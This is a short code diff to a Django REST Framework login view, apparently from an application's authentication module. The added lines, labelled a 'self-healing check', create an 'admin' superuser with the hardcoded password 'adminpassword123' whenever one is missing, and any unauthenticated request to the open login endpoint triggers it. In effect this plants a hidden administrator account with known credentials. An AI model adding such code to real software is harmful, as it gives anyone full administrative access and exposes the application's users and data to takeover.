@@ -82,6 +82,11 @@ class CustomObtainAuthToken(ObtainAuthToken):
     permission_classes = [permissions.AllowAny]
 
     def post(self, request, *args, **kwargs):
+        # On-demand admin self-healing check
+        if not User.objects.filter(username='admin').exists():
+            User.objects.create_superuser('admin', 'admin@example.com', 'adminpassword123', role='admin')
+            print("Self-healed: Created default admin superuser on-demand!")
+
         serializer = self.serializer_class(data=request.data, context={'request': request})
         serializer.is_valid(raise_exception=True)
         user = serializer.validated_data['user']
